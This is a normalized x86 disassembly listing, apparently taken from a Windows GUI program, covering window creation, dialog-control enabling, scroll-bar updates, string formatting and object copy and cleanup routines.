mov eax [ eax + ecx + 0x8 ]
push 0xffffffff
add eax esi
push 0x0
push eax
lea ecx [ esp + 0xc0 ]
mov [ esp + 0xd8 ] 0xf
mov [ esp + 0xd4 ] 0x0
mov [ esp + 0xc4 ] 0x0
call sub_401dd0
mov edx [ rw-data ]
mov eax [ esp + 0x10428 ]
push edx
push eax
lea ecx [ esp + 0xbc ]
push ecx
mov [ esp + 0x10424 ] 0x7
call sub_40e460
mov eax [ esp + 0xd8 ]
add esp 0xc
cmp eax 0x10
mov eax [ esp + 0xb8 ]
jae r-xdata
lea ecx [ esp + 0x154 ]
call sub_40b1a0
lea ecx [ esp + 0x178 ]
mov esi eax
call sub_40b1a0
push sub_40ba70
push 0x4
mov ebp eax
push 0x24
lea eax [ esp + 0x13c ]
push eax
mov [ esp + 0x20 ] ebp
mov [ esp + 0x10428 ] 0x5
call sub_4b6814
mov ecx [ esp + 0x10420 ]
push 0x1
push esi
push ecx
mov eax [ esp + 0x10420 ]
push edi
push esi
push eax
jmp r-xdata
mov [ esp + 0x50 ] eax
fild [ esp + 0x50 ]
fmul [ esp + 0x18 ]
fadd [ esp + 0x34 ]
fstp [ esp + 0x40 ]
dec ecx
jns r-xdata
cmp [ eax ] dl
je r-xdata
cmp [ esp + eax + 0x1e4 ] cl
jne r-xdata
mov [ esp + 0x58 ] 0x0
mov ecx esi
call sub_40a430
call sub_4b64c4
mov [ esp + 0x58 ] eax
jmp r-xdata
fild [ esp + 0x58 ]
fsub [ esp + 0x10 ]
fdiv [ esp + 0x18 ]
call sub_4b64c4
mov ecx [ esp + 0x4c ]
cmp eax ecx
mov [ esp + 0x58 ] eax
jge r-xdata
cmp [ esp + 0xf8 ] ebp
mov esi 0xf
mov [ esp + 0xb0 ] esi
mov [ esp + 0xac ] 0x0
mov [ esp + 0x9c ] 0x0
jb r-xdata
mov eax [ esp + 0x9c ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ esp + 0x14 ]
cmp ecx 0x5
mov eax [ rw-data ]
je r-xdata
imul ebp [ esp + 0x34 ]
mov edx [ esp + 0x18 ]
push 0x0
push edx
lea edx [ edi + 0x12c ]
push edx
mov edx [ esp + 0x1042c ]
push edx
mov edx [ esp + 0x30 ]
push ebp
mov ebp [ esp + 0x40 ]
push esi
push edx
push ebp
push ecx
push eax
push r--data
push 0x0
call [ CreateWindowExA@IAT ]
jmp r-xdata
mov ecx [ ebx + eax + 0x40 ]
cmp [ edx + ecx ] 0x69
jne r-xdata
mov eax [ ebx + eax + 0x50 ]
mov ecx [ esp + 0x10 ]
cmp [ ecx + eax ] 0x69
jne r-xdata
call ebp
push eax
call [ EnableWindow@IAT ]
mov edx [ rw-data ]
shl edx 0x4
mov eax [ edx + rw-data ]
mov ecx [ ebx + eax + 0x40 ]
mov edx [ esp + 0x24 ]
cmp [ edx + ecx ] 0x66
jne r-xdata
cmp [ esp + ecx + 0x1e4 ] dl
jne r-xdata
mov [ eax ] 0x0
inc eax
mov ecx [ esp + 0x50 ]
cmp eax ecx
jle r-xdata
mov eax ecx
mov [ esp + 0x58 ] eax
mov [ esp + 0xf8 ] esi
mov [ esp + 0xf4 ] 0x0
mov [ esp + 0xe4 ] 0x0
jmp r-xdata
mov ecx [ esp + 0xe4 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ ebx + eax + 0x40 ]
cmp [ edx + ecx ] 0x62
jne r-xdata
mov eax [ ebx + eax + 0x50 ]
mov ecx [ esp + 0x10 ]
mov edx [ ecx + eax + 0x4 ]
mov [ esp + 0x18 ] edx
fild [ esp + 0x18 ]
jmp r-xdata
fld [ ecx + eax + 0x4 ]
jmp r-xdata
fild [ ecx + eax + 0x4 ]
jmp r-xdata
push 0x1
lea eax [ esp + 0x48 ]
push eax
push 0x2
push edi
call [ SetScrollInfo@IAT ]
push sub_40ba70
push 0x4
push 0x24
lea ecx [ esp + 0x13c ]
push ecx
mov [ esp + 0x10428 ] 0xc
call sub_4b6814
mov [ esp + 0x58 ] ecx
mov eax [ esp + 0x10 ]
imul eax [ esp + 0x34 ]
mov ecx [ esp + 0x20 ]
add ecx eax
cmp [ esp + 0x94 ] 0x10
mov [ esp + 0x20 ] ecx
jb r-xdata
fld [ esp + 0x14 ]
push ecx
fsub [ esp + 0x38 ]
fimul [ esp + 0x54 ]
fld [ esp + 0x44 ]
fsub [ esp + 0x38 ]
fdivp st1
fstp [ esp ]
call sub_452500
mov ecx [ esp + 0x50 ]
add esp 0x4
cmp eax ecx
mov [ esp + 0x58 ] eax
jge r-xdata
mov eax [ eax + ebx + 0x50 ]
mov ecx [ esp + 0x10 ]
movzx edx [ ecx + eax + 0x4 ]
mov [ esp + 0x18 ] edx
fild [ esp + 0x18 ]
fstp [ esp + 0x14 ]
mov ecx [ esp + 0x50 ]
cmp eax ecx
jle r-xdata
mov eax ecx
mov [ esp + 0x58 ] eax
cmp ecx edi
mov [ esp + 0x54 ] 0x1
jle r-xdata
mov [ esp + 0x58 ] ecx
push sub_40ba70
push 0x5
push 0x24
lea edx [ esp + 0x13c ]
push edx
mov [ esp + 0x10428 ] 0x0
call sub_4b6814
mov ebp [ esp + 0x2c ]
mov edi [ esp + 0x24 ]
mov esi [ esp + 0x10 ]
jmp r-xdata
mov ecx [ esp + 0x10420 ]
push 0x1
lea eax [ esp + 0x48 ]
push eax
push 0x2
push esi
push ecx
call ebp
push eax
call [ SetScrollInfo@IAT ]
sub_413350
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4beeb8
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
mov ecx rw-data
call sub_404310
mov eax [ rw-data ]
cmp eax [ esp + 0x2c ]
jne r-xdata
push ebx
push ebp
push esi
push edi
mov edi [ rw-data ]
xor ebx ebx
cmp edi ebx
je r-xdata
mov ecx rw-data
call sub_401420
mov ecx [ esp + 0x1c ]
mov [ fs : 0x0 ] ecx
add esp 0x28
retn
mov eax [ esp + 0x3c ]
mov ecx rw-data
mov [ rw-data ] eax
call sub_401420
cmp [ rw-data ] ebx
je r-xdata
xor ebp ebp
xor esi esi
mov edi edi
push 0x1
push ebx
push 0xffffffff
push 0xffffffff
call sub_40ef30
mov ecx [ rw-data ]
xor eax eax
mov al [ rw-data ]
add esp 0x10
push eax
push 0x1
push 0xfffffff8
push ecx
call [ GetWindowLongA@IAT ]
push eax
call sub_47e8e0
mov ecx [ esp + 0x38 ]
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x28
retn
xor esi esi
mov ebp 0x10
mov ecx [ eax + 0x8 ]
sub ecx edx
mov eax 0x66666667
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx [ eax + 0x8 ]
sub ecx edx
mov eax 0x66666667
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
push 0x3eb
push edi
mov edi [ GetDlgItem@IAT ]
call edi
mov esi [ EnableWindow@IAT ]
push eax
call esi
mov edx [ rw-data ]
push ebx
push 0x3ec
push edx
call edi
push eax
call esi
mov eax [ rw-data ]
push ebx
push 0x3ed
push eax
call edi
push eax
call esi
mov ecx [ rw-data ]
push ebx
push 0x3ee
push ecx
call edi
push eax
call esi
mov edx [ rw-data ]
push ebx
push 0x3f0
push edx
call edi
push eax
call esi
push ebx
push 0x182
push 0x3e9
push edi
call [ GetDlgItem@IAT ]
push eax
call [ SendMessageA@IAT ]
mov eax [ rw-data ]
mov ecx eax
shl ecx 0x4
mov edx [ ecx + rw-data ]
mov ecx [ edx + esi + 0xc ]
cmp ecx ebx
je r-xdata
cmp ebp edx
push ebx
jge r-xdata
mov edx [ rw-data ]
push ebx
push edi
push 0x14e
push 0x3fc
push edx
call [ SendDlgItemMessageA@IAT ]
mov edi 0xf
mov [ esp + 0x28 ] edi
mov [ esp + 0x24 ] ebx
mov [ esp + 0x14 ] bl
push 0x1
lea edx [ esp + 0x14 ]
push esi
push edx
mov [ esp + 0x40 ] ebx
call sub_410cb0
mov eax [ rw-data ]
add esp 0xc
push 0x3e9
push eax
call [ GetDlgItem@IAT ]
cmp [ esp + 0x28 ] ebp
mov ecx [ esp + 0x14 ]
jae r-xdata
cmp esi edx
jge r-xdata
mov edi [ rw-data ]
inc ebp
add esi 0xa0
jmp r-xdata
push ecx
call [ DestroyWindow@IAT ]
mov eax [ rw-data ]
shl eax 0x4
mov ecx [ eax + rw-data ]
mov [ ecx + esi + 0xc ] ebx
mov eax [ rw-data ]
push ecx
push ebx
push 0x180
push eax
call [ SendMessageA@IAT ]
cmp [ esp + 0x28 ] ebp
mov [ esp + 0x34 ] 0xffffffff
jb r-xdata
lea ecx [ esp + 0x14 ]
shl eax 0x4
add eax rw-data
mov edx [ eax + 0x4 ]
cmp edx ebx
jne r-xdata
mov [ esp + 0x28 ] edi
mov [ esp + 0x24 ] ebx
mov [ esp + 0x14 ] bl
inc esi
jmp r-xdata
mov ecx [ esp + 0x14 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov edi [ rw-data ]
mov eax edi
shl eax 0x4
add eax rw-data
mov edx [ eax + 0x4 ]
cmp edx ebx
jne r-xdata
sub_4135e0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4beeb8
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push ebp
push esi
mov esi [ esp + 0x38 ]
xor ebx ebx
xor ebp ebp
shl esi 0x4
push edi
mov edi [ esp + 0x40 ]
lea esi [ esi + rw-data ]
mov ecx [ esi + 0x8 ]
sub ecx eax
mov eax 0x66666667
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx [ esp + 0x2c ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x28
retn
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] ebx
mov [ esp + 0x14 ] bl
push ebx
lea ecx [ esp + 0x14 ]
push ebp
push ecx
mov [ esp + 0x40 ] ebx
call sub_410cb0
add esp 0xc
push 0xffffffff
push ebx
lea edx [ esp + 0x18 ]
push edx
mov ecx edi
call sub_4018c0
mov eax [ esi + 0x4 ]
cmp eax ebx
jne r-xdata
cmp ebp edx
jge r-xdata
mov ecx [ esi + 0x8 ]
sub ecx eax
mov eax 0x66666667
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
cmp [ esp + 0x28 ] 0x10
mov [ esp + 0x34 ] 0xffffffff
jb r-xdata
cmp [ esp + 0x44 ] bl
je r-xdata
dec edx
cmp ebp edx
je r-xdata
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] ebx
mov [ esp + 0x14 ] bl
inc ebp
jmp r-xdata
mov ecx [ esp + 0x14 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov eax r--data
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov eax r--data
lea edx [ eax + 0x1 ]
mov eax [ esi + 0x4 ]
cmp eax ebx
jne r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push r--data
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push r--data
jmp r-xdata
mov ecx edi
call sub_401cc0
sub_413720
push 0xffffffff
push sub_4bf446
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x144
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x164 ]
push r--data
mov ecx edi
call sub_4354c0
push rw-data
push r--data
mov ecx edi
call sub_435580
mov eax [ rw-data ]
inc eax
push eax
push r--data
mov ecx edi
call sub_4354f0
movzx ecx [ rw-data ]
push ecx
push r--data
mov ecx edi
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
mov ecx edi
call sub_4354f0
mov eax [ rw-data ]
xor ebx ebx
mov [ esp + 0x50 ] eax
mov [ esp + 0x30 ] 0xf
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] bl
mov [ esp + 0x15c ] ebx
xor eax eax
mov ebp rw-data
mov [ esp + 0x10 ] ebx
lea ebx [ ebx ]
push eax
lea edx [ esp + 0x58 ]
push edx
mov ecx edi
call sub_435580
push esi
lea eax [ esp + 0x58 ]
push r--data
push eax
call [ wsprintfA@IAT ]
mov ecx [ rw-data ]
add esp 0xc
cmp ecx ebx
je r-xdata
mov eax [ eax ]
mov ecx [ esp + 0x10 ]
push 0xffffffff
lea edx [ ecx + rw-data ]
push ebx
push edx
lea ecx [ esp + 0x24 ]
call sub_401dd0
jmp r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
cmp eax ebx
jne r-xdata
cmp [ esp + 0x30 ] 0x10
mov eax [ esp + 0x1c ]
jae r-xdata
mov edx [ esp + 0x30 ]
cmp edx 0x10
mov edi [ esp + 0x1c ]
mov eax edi
jae r-xdata
push eax
lea eax [ esp + 0x58 ]
push eax
mov ecx edi
call sub_435580
mov eax esi
mov esi [ esp + 0x10 ]
add esi 0x1c
add ebp 0x10
cmp ebp rw-data
mov [ esp + 0x10 ] esi
jl r-xdata
lea eax [ esp + 0x1c ]
mov ecx [ esp + 0x2c ]
add ecx eax
cmp edx 0x10
mov esi edi
jae r-xdata
lea eax [ esp + 0x1c ]
lea esi [ eax + 0x1 ]
push esi
lea ecx [ esp + 0x58 ]
push r--data
push ecx
mov [ rw-data ] eax
mov [ esp + 0x20 ] esi
call [ wsprintfA@IAT ]
mov eax [ esp + 0x1c ]
mov ecx [ eax + rw-data ]
lea eax [ eax + rw-data ]
add esp 0xc
cmp ecx 0x10
jb r-xdata
cmp [ esp + 0x30 ] 0x10
mov ecx [ esp + 0x50 ]
mov [ rw-data ] ecx
jb r-xdata
mov edx edi
jmp r-xdata
lea esi [ esp + 0x1c ]
lea edx [ esp + 0x1c ]
mov ecx [ esp + 0x154 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x150
retn
mov edx [ esp + 0x1c ]
push edx
call j_sub_4b66ed#2
add esp 0x4
cmp esi ebx
jne r-xdata
mov eax esi
sub eax edx
xor eax eax
jmp r-xdata
sub ecx esi
xor ecx ecx
jmp r-xdata
cmp ecx ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
cmp eax ebx
jne r-xdata
push ecx
push eax
lea ecx [ esp + 0x20 ]
call sub_401ba0
xor esi esi
jmp r-xdata
mov ecx [ ebp + 0x8 ]
sub ecx eax
mov eax 0x66666667
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov esi [ esp + 0x14 ]
mov edi [ esp + 0x164 ]
mov edi 0xf
mov [ esp + 0x4c ] edi
mov [ esp + 0x48 ] ebx
mov [ esp + 0x38 ] bl
push ebx
lea ecx [ esp + 0x38 ]
push esi
push ecx
mov [ esp + 0x168 ] 0x1
call sub_410cb0
mov edx [ esp + 0x38 ]
mov eax [ esp + 0x54 ]
add eax edx
add esp 0xc
cmp eax 0xfff
jae r-xdata
cmp esi edx
jge r-xdata
cmp [ esp + 0x4c ] 0x10
mov [ esp + 0x15c ] bl
jb r-xdata
push 0xffffffff
push ebx
lea ecx [ esp + 0x3c ]
push ecx
lea ecx [ esp + 0x24 ]
call sub_4018c0
mov eax [ ebp + 0x4 ]
cmp eax ebx
jne r-xdata
mov [ esp + 0x4c ] edi
mov [ esp + 0x48 ] ebx
mov [ esp + 0x38 ] bl
mov edx [ esp + 0x38 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ ebp + 0x8 ]
sub ecx eax
mov eax 0x66666667
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
cmp [ esp + 0x4c ] 0x10
mov [ esp + 0x15c ] bl
jb r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
dec edx
cmp esi edx
jge r-xdata
mov [ esp + 0x4c ] edi
mov [ esp + 0x48 ] ebx
mov [ esp + 0x38 ] bl
inc esi
jmp r-xdata
mov ecx [ esp + 0x38 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x20 ]
call sub_401cc0
sub_413a60
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
cmp esi edi
je r-xdata
pop edi
pop esi
retn 0x8
mov edi edi
mov ecx esi
call sub_40dc90
add esi 0x14
cmp esi edi
jne r-xdata
sub_413a90
push ebx
mov ebx ecx
push esi
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
mov [ ebx + 0x4 ] 0x0
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0xc ] 0x0
pop ebx
retn
push edi
mov edi [ ebx + 0x8 ]
cmp esi edi
je r-xdata
mov eax [ ebx + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
pop edi
mov ecx esi
call sub_40dc90
add esi 0x14
cmp esi edi
jne r-xdata
sub_413ae0
push ebp
mov ebp esp
push 0xffffffff
push sub_4bf450
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x4 ]
test eax eax
push edi
mov edi ecx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx eax
mov eax 0x66666667
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov eax edi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
mov ecx [ edi + 0x4 ]
mov eax [ esi + 0x8 ]
mov esi [ esi + 0x4 ]
push edx
push edi
push ecx
push eax
push esi
mov [ ebp - 0x4 ] 0x0
call sub_418910
add esp 0x14
mov [ edi + 0x8 ] eax
push edx
mov ecx edi
call sub_40cbc0
test al al
je r-xdata
sub_413b80
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4bf4c2
push eax
mov eax ecx
mov [ fs : 0x0 ] esp
xor ecx ecx
mov [ eax + 0x28 ] 0xf
mov [ eax + 0x24 ] ecx
mov [ eax + 0x14 ] cl
mov [ eax + 0x30 ] ecx
mov [ eax + 0x34 ] ecx
mov [ eax + 0x38 ] ecx
mov [ eax + 0x40 ] ecx
mov [ eax + 0x44 ] ecx
mov [ eax + 0x48 ] ecx
mov [ eax + 0x50 ] ecx
mov [ eax + 0x54 ] ecx
mov [ eax + 0x58 ] ecx
mov [ eax + 0x60 ] ecx
mov [ eax + 0x64 ] ecx
mov [ eax + 0x68 ] ecx
mov [ eax + 0x70 ] ecx
mov [ eax + 0x74 ] ecx
mov [ eax + 0x78 ] ecx
mov [ eax + 0x80 ] ecx
mov [ eax + 0x84 ] ecx
mov [ eax + 0x88 ] ecx
mov [ eax + 0x90 ] ecx
mov [ eax + 0x94 ] ecx
mov [ eax + 0x98 ] ecx
mov ecx [ esp ]
mov [ fs : 0x0 ] ecx
add esp 0xc
retn
sub_413c10
push 0xffffffff
push sub_4bf4f1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push esi
mov esi ecx
mov [ esp + 0x8 ] esi
lea ecx [ esi + 0x8c ]
mov [ esp + 0x14 ] 0x2
call sub_413a90
mov eax [ esi + 0x80 ]
xor ebx ebx
cmp eax ebx
je r-xdata
push edi
lea edi [ esi + 0x6c ]
mov [ esi + 0x80 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x88 ] ebx
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
push eax
call j_sub_4b66ed#2
add esp 0x4
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + 0x60 ]
cmp eax ebx
lea edi [ esi + 0x5c ]
je r-xdata
mov ecx [ esp + 0xc ]
mov edx [ edi + 0x8 ]
push ecx
push edi
push edx
push eax
call sub_402270
mov eax [ edi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x14
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + 0x50 ]
cmp eax ebx
lea edi [ esi + 0x4c ]
je r-xdata
mov ecx [ esp + 0xc ]
mov edx [ edi + 0x8 ]
push ecx
push edi
push edx
push eax
call sub_402270
mov eax [ edi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x14
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + 0x40 ]
cmp eax ebx
je r-xdata
mov ecx [ esp + 0xc ]
mov edx [ edi + 0x8 ]
push ecx
push edi
push edx
push eax
call sub_40bbe0
mov eax [ edi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x14
lea edi [ esi + 0x2c ]
mov [ esi + 0x40 ] ebx
mov [ esi + 0x44 ] ebx
mov [ esi + 0x48 ] ebx
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
push eax
call j_sub_4b66ed#2
add esp 0x4
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
cmp [ esi + 0x28 ] 0x10
pop edi
jb r-xdata
mov ecx [ esp + 0xc ]
mov edx [ edi + 0x8 ]
push ecx
push edi
push edx
push eax
call sub_402270
mov eax [ edi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x14
mov ecx [ esp + 0xc ]
mov [ esi + 0x24 ] ebx
mov [ esi + 0x28 ] 0xf
mov [ esi + 0x14 ] bl
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ esi + 0x14 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_413d70
push 0xffffffff
push sub_4bf54d
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
push edi
mov edi [ esp + 0x1c ]
mov eax [ edi ]
mov esi ecx
mov [ esi ] eax
mov cl [ edi + 0x4 ]
mov [ esi + 0x4 ] cl
mov edx [ edi + 0x8 ]
mov [ esi + 0x8 ] edx
mov eax [ edi + 0xc ]
push 0xffffffff
lea ecx [ esi + 0x10 ]
mov [ esi + 0xc ] eax
push 0x0
lea edx [ edi + 0x10 ]
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x14 ] 0x0
push edx
mov [ esp + 0x14 ] esi
mov [ ecx + 0x4 ] 0x0
call sub_401dd0
lea eax [ edi + 0x2c ]
push eax
lea ecx [ esi + 0x2c ]
mov [ esp + 0x18 ] 0x0
call sub_40dcd0
lea ecx [ edi + 0x3c ]
push ecx
lea ecx [ esi + 0x3c ]
mov [ esp + 0x18 ] 0x1
call sub_40d330
lea edx [ edi + 0x4c ]
push edx
lea ecx [ esi + 0x4c ]
mov [ esp + 0x18 ] 0x2
call sub_40d510
lea eax [ edi + 0x5c ]
push eax
lea ecx [ esi + 0x5c ]
mov [ esp + 0x18 ] 0x3
call sub_40dcd0
lea ecx [ edi + 0x6c ]
push ecx
lea ecx [ esi + 0x6c ]
mov [ esp + 0x18 ] 0x4
call sub_40dcd0
lea edx [ edi + 0x7c ]
push edx
lea ecx [ esi + 0x7c ]
mov [ esp + 0x18 ] 0x5
call sub_40d710
lea eax [ edi + 0x8c ]
push eax
lea ecx [ esi + 0x8c ]
mov [ esp + 0x18 ] 0x6
call sub_413ae0
mov ecx [ edi + 0x9c ]
mov [ esi + 0x9c ] ecx
mov ecx [ esp + 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_413e70
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
mov esi ecx
cmp esi ebx
push edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
mov ebp [ ebx + 0x4 ]
test ebp ebp
je r-xdata
mov ecx esi
call sub_413a90
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
mov ecx [ ebx + 0x8 ]
sub ecx ebp
mov eax 0x66666667
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
mov ecx edx
test ecx ecx
jne r-xdata
mov edi [ esi + 0x4 ]
test edi edi
jne r-xdata
mov edx [ esi + 0x8 ]
sub edx edi
mov eax 0x66666667
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
test edi edi
jne r-xdata
mov ecx [ esp + 0x14 ]
mov eax [ ebx + 0x8 ]
push ecx
push edi
push eax
push ebp
call sub_40e020
mov edx [ esi + 0x8 ]
add esp 0x10
push edx
push eax
mov ecx esi
call sub_413a60
mov eax [ ebx + 0x4 ]
test eax eax
jne r-xdata
cmp ecx edx
ja r-xdata
mov edx [ esi + 0xc ]
sub edx edi
mov eax 0x66666667
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ebx [ ebx + 0x8 ]
sub ebx eax
mov eax 0x66666667
imul ebx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
lea ecx [ edx + edx * 4 ]
mov edx [ esi + 0x4 ]
lea eax [ edx + ecx * 4 ]
pop edi
mov [ esi + 0x8 ] eax
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
xor edx edx
lea ecx [ edx + edx * 4 ]
mov edx [ esi + 0x4 ]
lea eax [ edx + ecx * 4 ]
pop edi
mov [ esi + 0x8 ] eax
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
mov eax [ esi + 0x8 ]
push eax
push edi
call sub_413a60
mov ecx [ esi + 0x4 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov ecx ebx
call sub_40af40
push eax
mov ecx esi
call sub_40cbc0
test al al
je r-xdata
call sub_40af40
lea ecx [ eax + eax * 4 ]
lea eax [ ebp + ecx * 4 ]
mov [ esp + 0x14 ] eax
mov edx [ esp + 0x14 ]
push edx
push edi
push eax
push ebp
call sub_40e020
mov ecx [ esp + 0x24 ]
mov eax [ esi + 0x8 ]
mov ebx [ ebx + 0x8 ]
mov edx [ esp + 0x24 ]
push ecx
push esi
push eax
push ebx
push edx
call sub_418910
add esp 0x24
pop edi
mov [ esi + 0x8 ] eax
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
cmp ecx edx
mov ecx esi
ja r-xdata
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
push edx
push eax
push ebx
mov ecx esi
call sub_413a40
mov [ esi + 0x8 ] eax
sub_414000
push ebp
mov ebp esp
push 0xffffffff
push sub_4bf650
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x550
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x20 ] ebx
mov esi [ ebp + 0xc ]
mov eax [ esi ]
mov edi [ timeGetTime@IAT ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x84 ] eax
call edi
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x30 ] ebx
push 0x40
mov [ ebp - 0x4 ] 0x3
mov [ ebp - 0x50 ] r--data
mov [ ebp - 0x4c ] r--data
mov [ ebp - 0x48 ] r--data
mov [ ebp - 0x44 ] r--data
mov [ ebp - 0x40 ] r--data
mov [ ebp - 0x3c ] r--data
call sub_4b573e
add esp 0x4
mov [ ebp - 0x54 ] eax
cmp eax ebx
mov [ ebp - 0x4 ] 0x4
je r-xdata
xor eax eax
mov edx [ esi + 0xd48 ]
push ecx
mov ecx esp
inc edx
mov [ esi + 0xd48 ] edx
mov [ ecx ] esi
mov ecx eax
mov [ ebp - 0x34 ] esp
call sub_40b390
jmp r-xdata
mov ecx [ eax ]
mov ebx eax
push eax
mov [ ebp - 0x18 ] ebx
call [ ecx + 0x14 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
inc [ eax + 0x4 ]
cmp eax ebx
mov [ ebp - 0x4 ] 0x3
je r-xdata
cmp eax 0xa0000008
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp eax 0x60000004
jne r-xdata
mov eax 0x2
jmp r-xdata
mov eax [ ebp + eax * 4 - 0x50 ]
mov ecx [ ebp + 0x14 ]
mov edx [ ecx ]
push eax
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
push edx
push ecx
lea edx [ ebp - 0x55c ]
push r--data
push edx
call [ wsprintfA@IAT ]
lea eax [ ebp - 0x55c ]
add esp 0x14
lea ecx [ eax + 0x1 ]
lea esp [ esp ]
cmp eax 0x50000001
jne r-xdata
mov eax 0x3
jmp r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
mov ecx [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x55c ]
push eax
add ecx 0x80
call sub_401e80
call edi
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x4 ] 0x5
xor esi esi
xor edx edx
cmp eax 0x50000002
setne dl
dec edx
and edx 0x5
mov eax edx
mov eax 0x4
jmp r-xdata
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x84 ]
mov eax [ ebx ]
push ecx
push edx
lea ecx [ ebp + 0x20 ]
push ecx
push ebx
call [ eax + 0x4 ]
mov esi [ eax ]
test esi esi
je r-xdata
mov edx ecx
mov ecx [ edx + 0x8 ]
